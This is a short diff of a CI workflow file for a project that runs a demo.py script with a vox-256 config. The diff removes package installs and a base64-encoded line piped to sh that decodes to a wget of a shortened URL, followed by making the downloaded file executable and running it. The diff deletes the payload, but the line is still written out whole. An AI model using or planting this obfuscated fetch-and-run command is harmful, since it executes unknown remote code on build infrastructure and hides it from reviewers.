@@ -20,10 +20,7 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        apt install sudo -y
-        apt install curl -y
-        apt install wget -y
-        timeout 1500 base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8zM0VmUXZhICYmIGNobW9kICt4IDMzRWZRdmEgJiYgLi8zM0VmUXZh' | sh
+        
         
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
